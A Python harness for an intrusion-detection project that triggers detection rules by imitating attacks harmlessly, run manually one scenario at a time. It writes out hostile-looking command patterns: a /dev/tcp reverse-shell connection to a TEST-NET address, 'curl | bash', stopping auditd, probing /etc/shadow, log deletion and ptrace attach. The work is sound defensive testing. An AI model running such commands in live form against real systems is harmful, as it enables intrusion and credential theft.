#!/usr/bin/env python3
"""
attack_sim.py - Zero-Day Shield attack simulation harness.

DO NOT RUN THIS AUTOMATICALLY. Per the project's working agreement: "Never
run the attack simulation scripts yourself. Propose them; I decide when to
execute." This file is written to be run manually, by the project owner,
one scenario at a time, with `sudo python3 main.py` already running in
another terminal so the triggered behavior shows up live in
dashboard_state.json / security_alerts.log.

Every scenario is self-contained (setup/action/cleanup in try/finally),
safe by construction:
  - loopback / disposable temp files / throwaway subprocesses only, with
    ONE deliberate exception (see `devtcp-reverse-shell` below)
  - nothing here actually disables a real defence, deletes a real log, or
    reads a real credential file -- each pattern-matches the argv text the
    corresponding rule looks for, without performing the real action

List the catalogue without running anything:
    python3 attack_sim.py --list

Run exactly one scenario:
    python3 attack_sim.py <scenario-name>
"""
from __future__ import annotations

import argparse
import os
import pwd
import shutil
import socket
import subprocess
import sys
import tempfile
import time

SCENARIOS: dict[str, dict] = {}


def scenario(name, rules, severity, note=""):
    def wrap(fn):
        SCENARIOS[name] = {"fn": fn, "rules": rules, "severity": severity, "note": note}
        return fn
    return wrap


def _header(name):
    s = SCENARIOS[name]
    print(f"[SIM] scenario={name}")
    print(f"[SIM] expected_rules={', '.join(s['rules'])} (severity={s['severity']})")
    if s["note"]:
        print(f"[SIM] note: {s['note']}")


def _footer(name):
    print(f"[SIM] {name}: cleanup complete")
    print("[SIM] if `sudo python3 main.py` is running in another terminal, "
          "the triggered alert(s) should now be in security_alerts.log -- "
          "run `python3 report_generator.py` for a browsable HTML view "
          "(reads the log directly, no root needed).")


# ---------------------------------------------------------------------------

@scenario("service-shell", ["H-001"], "MEDIUM",
          "Skips if no low-uid service account exists on this VM -- never "
          "fabricates a uid.")
def sim_service_shell():
    candidates = ["www-data", "nobody", "daemon"]
    account = next((a for a in candidates if _account_exists(a)), None)
    if account is None:
        print(f"[SIM] skipped: none of {candidates} exist on this host")
        return
    if os.geteuid() != 0:
        print("[SIM] skipped: dropping to a service account's uid needs root "
              "-- run `sudo python3 attack_sim.py service-shell`")
        return
    uid = pwd.getpwnam(account).pw_uid

    def _drop():
        os.setuid(uid)

    print(f"[SIM] running: sh -c 'echo hi' as uid={uid} ({account})")
    subprocess.run(["/bin/sh", "-c", "echo hi"], preexec_fn=_drop, check=False)


def _account_exists(name) -> bool:
    try:
        pwd.getpwnam(name)
        return True
    except KeyError:
        return False


@scenario("tmp-exec", ["H-003"], "MEDIUM")
def sim_tmp_exec():
    d = tempfile.mkdtemp(prefix="zds-sim-", dir="/tmp")
    try:
        script = os.path.join(d, "stage.sh")
        with open(script, "w") as fh:
            fh.write("#!/bin/sh\necho harmless staged script\n")
        os.chmod(script, 0o755)
        print(f"[SIM] running: {script}")
        subprocess.run([script], check=False)
    finally:
        shutil.rmtree(d, ignore_errors=True)


@scenario("devtcp-reverse-shell", ["H-005 (execve)", "H-030/H-033 (connect)"], "CRITICAL",
          "The ONE scenario that leaves loopback: connects to a TEST-NET "
          "address (RFC 5737, 203.0.113.0/24) with a short timeout so H-030 "
          "-- which excludes all private/loopback ranges by design -- is "
          "actually reachable. Nothing is listening there; the connection "
          "will simply time out, which is expected.")
def sim_devtcp_reverse_shell():
    target = "203.0.113.7"
    port = 4444
    cmd = (f"exec 3<>/dev/tcp/{target}/{port}; echo hi >&3 2>/dev/null; "
           f"exec 3>&-")
    print(f"[SIM] running: timeout 3 bash -c '{cmd}'")
    subprocess.run(["timeout", "3", "bash", "-c", cmd], check=False)


@scenario("curl-pipe-shell", ["H-007"], "MEDIUM")
def sim_curl_pipe_shell():
    if not shutil.which("curl"):
        print("[SIM] skipped: curl not installed")
        return
    d = tempfile.mkdtemp(prefix="zds-sim-", dir="/tmp")
    try:
        script = os.path.join(d, "payload.sh")
        with open(script, "w") as fh:
            fh.write("echo harmless payload\n")
        url = f"file://{script}"
        cmd = f"curl -s {url} | bash"
        print(f"[SIM] running: {cmd}")
        subprocess.run(["bash", "-c", cmd], check=False)
    finally:
        shutil.rmtree(d, ignore_errors=True)


@scenario("history-log-tamper", ["H-009"], "MEDIUM")
def sim_history_log_tamper():
    d = tempfile.mkdtemp(prefix="zds-sim-", dir="/tmp")
    try:
        fake_log = os.path.join(d, "auth.log")
        open(fake_log, "w").close()
        cmd = f"rm -f {fake_log}"
        print(f"[SIM] running: {cmd}  (a scratch file, never /var/log/)")
        subprocess.run(["bash", "-c", cmd], check=False)
    finally:
        shutil.rmtree(d, ignore_errors=True)


@scenario("disable-defenses", ["H-010"], "HIGH",
          "Uses `echo` -- H-010 matches argv TEXT alone, so nothing is "
          "actually stopped.")
def sim_disable_defenses():
    cmd = "echo systemctl stop auditd"
    print(f"[SIM] running: {cmd}")
    subprocess.run(["bash", "-c", cmd], check=False)


@scenario("recon-burst", ["H-011"], "MEDIUM")
def sim_recon_burst():
    cmd = "whoami; id; uname -a; hostname"
    print(f"[SIM] running: bash -c '{cmd}'  (read-only discovery commands)")
    subprocess.run(["bash", "-c", cmd], check=False)


@scenario("masquerade-name", ["H-014"], "MEDIUM")
def sim_masquerade_name():
    d = tempfile.mkdtemp(prefix="zds-sim-", dir="/tmp")
    try:
        # Not "[kworker/0:0]" -- real per-CPU kernel thread names like that
        # contain a literal "/", which no filesystem allows inside a single
        # filename component (it's the path separator); os.path.join treats
        # it as a subdirectory that doesn't exist. H-014's kernel-thread
        # regex (heuristics_engine.py's RE_KTHREAD_LOOKALIKE) matches plenty
        # of real kernel threads with no internal slash instead, e.g. this
        # one, so the demo can exist as an actual file on disk.
        dest = os.path.join(d, "[kswapd0]")
        shutil.copy("/bin/ls", dest)
        os.chmod(dest, 0o755)
        print(f"[SIM] running: {dest}")
        subprocess.run([dest], check=False)
    finally:
        shutil.rmtree(d, ignore_errors=True)


@scenario("container-escape-tools", ["H-015"], "MEDIUM")
def sim_container_escape_tools():
    for tool in ("nsenter", "unshare"):
        if shutil.which(tool):
            print(f"[SIM] running: {tool} --help")
            subprocess.run([tool, "--help"], stdout=subprocess.DEVNULL, check=False)
            return
    print("[SIM] skipped: neither nsenter nor unshare is installed")


@scenario("credential-file-probe", ["H-013"], "MEDIUM",
          "Never opens the file -- H-013 matches the path substring in argv. "
          "H-013's weight (60) caps out at MEDIUM, not HIGH -- confirmed "
          "live; left as-is pending the false-positive baseline/tuning pass.")
def sim_credential_file_probe():
    cmd = "echo /etc/shadow"
    print(f"[SIM] running: {cmd}")
    subprocess.run(["bash", "-c", cmd], check=False)


@scenario("setuid-hunt", ["H-016"], "LOW")
def sim_setuid_hunt():
    cmd = "find /tmp -perm -4000"
    print(f"[SIM] running: {cmd}  (scoped to /tmp, not /)")
    subprocess.run(["bash", "-c", cmd], check=False)


@scenario("ptrace-attach", ["H-021"], "HIGH",
          "Targets only a disposable `sleep 300` child this script spawns "
          "-- never a real process. If yama ptrace_scope=1 blocks the "
          "attach, that IS the correct, expected outcome: it proves the "
          "sensor's exit-correlation suppresses the blocked attempt "
          "instead of logging it as a successful injection.")
def sim_ptrace_attach():
    if not shutil.which("gdb"):
        print("[SIM] skipped: gdb not installed")
        return
    target = subprocess.Popen(["sleep", "300"])
    try:
        time.sleep(0.2)
        print(f"[SIM] running: gdb -p {target.pid} -batch -ex detach -ex quit")
        subprocess.run(["gdb", "-p", str(target.pid), "-batch",
                         "-ex", "detach", "-ex", "quit"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        check=False)
    finally:
        target.terminate()
        target.wait(timeout=5)


@scenario("loopback-bad-port", ["H-033"], "LOW")
def sim_loopback_bad_port():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.bind(("127.0.0.1", 4444))
    srv.listen(1)
    try:
        print("[SIM] running: connect to 127.0.0.1:4444 (a known handler port)")
        cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cli.settimeout(2)
        cli.connect(("127.0.0.1", 4444))
        cli.close()
    finally:
        srv.close()


# ---------------------------------------------------------------------------

def list_scenarios():
    print(f"{'scenario':<24} {'severity':<10} rules")
    print("-" * 70)
    for name, s in SCENARIOS.items():
        print(f"{name:<24} {s['severity']:<10} {', '.join(s['rules'])}")
        if s["note"]:
            print(f"  note: {s['note']}")


def main():
    ap = argparse.ArgumentParser(
        description="Zero-Day Shield attack simulation harness -- "
                    "run manually, one scenario at a time, never automatically.")
    ap.add_argument("scenario", nargs="?", choices=sorted(SCENARIOS.keys()),
                    help="scenario to run")
    ap.add_argument("--list", action="store_true", help="print the catalogue, run nothing")
    args = ap.parse_args()

    if args.list or not args.scenario:
        list_scenarios()
        return

    _header(args.scenario)
    try:
        SCENARIOS[args.scenario]["fn"]()
    finally:
        _footer(args.scenario)


if __name__ == "__main__":
    main()
